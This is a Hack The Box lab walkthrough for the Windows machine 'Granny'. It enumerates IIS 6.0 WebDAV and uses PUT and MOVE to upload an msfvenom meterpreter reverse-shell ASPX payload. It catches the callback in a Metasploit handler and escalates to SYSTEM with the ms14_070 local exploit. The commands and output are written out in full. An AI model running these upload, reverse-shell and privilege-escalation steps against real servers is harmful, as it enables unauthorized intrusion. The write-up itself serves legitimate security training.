---
layout: walkthrough
title: Granny
description: "HTB walkthrough"
logo: /assets/img/walkthroughs/granny_logo.png
show-avatar: false
permalink: /walkthroughs/granny.html
OS: Windows
difficulty: Easy
release: 12 Apr 2017
creator: <a href="https://www.hackthebox.eu/home/users/profile/1">ch4p</a>
cleared: 12 Nov 2019
published: 2019 11 12
---

<h2 align="center">Enumeration</h2>

Starting with a standard nmap scan...

```
# Nmap 7.80 scan initiated Tue Nov 12 17:01:01 2019 as: nmap -sC -sV -p- -oN nmapscan.txt 10.10.10.15
Nmap scan report for 10.10.10.15
Host is up (0.080s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/6.0
|   WebDAV type: Unknown
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Date: Tue, 12 Nov 2019 22:03:04 GMT
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Nov 12 17:03:00 2019 -- 1 IP address (1 host up) scanned in 118.58 seconds
```

we see the only open port is **80** and if we navigate to the page we see a default "Under Construction" page. However we see from the scan that it using webDAV. So lets run **davtest**

![davtest](/assets/img/walkthroughs/granny_davtest.png)

Looking at the output of running **nikto** we see that the server is running ASP.net.

```
- Nikto v2.1.6/2.1.5
+ Target Host: 10.10.10.15
+ Target Port: 80
+ GET Retrieved microsoftofficewebserver header: 5.0_Pub
+ GET Retrieved x-powered-by header: ASP.NET
<...>
```

However davtest shows us that we can't use PUT to upload an asp or aspx file. However running davtest with the -move flag

```
root@kali:~/HTB/Boxes/Granny# davtest -url http://10.10.10.15 -move                       <...>  
Sending test files (MOVE method)
<...>
PUT     txt     SUCCEED:        http://10.10.10.15/DavTestDir_ZinCoKvq/davtest_ZinCoKvq_asp.txt
MOVE    asp     SUCCEED:        http://10.10.10.15/DavTestDir_ZinCoKvq/davtest_ZinCoKvq.asp                               <...>
http://10.10.10.15/DavTestDir_ZinCoKvq/davtest_ZinCoKvq.cfm
PUT     txt     SUCCEED:        http://10.10.10.15/DavTestDir_ZinCoKvq/davtest_ZinCoKvq_aspx.txt
MOVE    aspx    SUCCEED:
<...>
```

shows us that we can use MOVE to change a file extension to .asp or .aspx

With that knowledge, let's create an .aspx payload and upload it as a .html file and rename it to .aspx file

<h3 align="center">Explotation</h3>

Let's create a payload with **msfvenom**

```sh
root@kali:~/HTB/Boxes/Granny# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=4444 -f aspx -o hilbert.html                                     
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of aspx file: 2818 bytes 
Saved as: hilbert.html
```

Now we'll use **curl** to upload the file to the server and change the extension

```sh
root@kali:~/HTB/Boxes/Granny# curl http://10.10.10.15 --upload-file hilbert.html
root@kali:~/HTB/Boxes/Granny# curl -X MOVE --header 'Destination:http://10.10.10.15/hilbert.aspx' 'http://10.10.10.15/hilbert.html'
```

Then we will run **Metasploit** and use a multi hander to listen for our shell

```
msf5 > use exploit/multi/handler 
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost tun0
lhost => tun0
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.7:4444 
```

Then we will direct our browser to hilbert.aspx to activate our reverse shell

```
[*] Started reverse TCP handler on 10.10.14.7:4444 
[*] Sending stage (180291 bytes) to 10.10.10.15
[*] Meterpreter session 1 opened (10.10.14.7:4444 -> 10.10.10.15:1031) at 2019-11-18 16:30:40 -0500

meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE
```

Next we will use exploit suggester to find a vulnerability we can use for privilege escalation

```
meterpreter > bg
[*] Backgrounding session 1...
msf5 exploit(multi/handler) > search suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester


msf5 exploit(multi/handler) > use 0
msf5 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf5 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.15 - Collecting local exploits for x86/windows...
[*] 10.10.10.15 - 29 exploit checks are being tried...
[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed

```

The exploit that will work is "exploit/windows/local/ms14_070_tcpip_ioctl"

```
msf5 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms14_070_tcpip_ioctl
msf5 exploit(windows/local/ms14_070_tcpip_ioctl) > set session 1
session => 1
msf5 exploit(windows/local/ms14_070_tcpip_ioctl) > run

[*] Started reverse TCP handler on 10.0.2.15:4444 
[*] Storing the shellcode in memory...
[*] Triggering the vulnerability...
[*] Checking privileges after exploitation...
[+] Exploitation successful!
[*] Exploit completed, but no session was created.
msf5 exploit(windows/local/ms14_070_tcpip_ioctl) > session -i 1
[-] Unknown command: session.
msf5 exploit(windows/local/ms14_070_tcpip_ioctl) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

We now have full access to the system and can read the user.txt and root.txt flags.
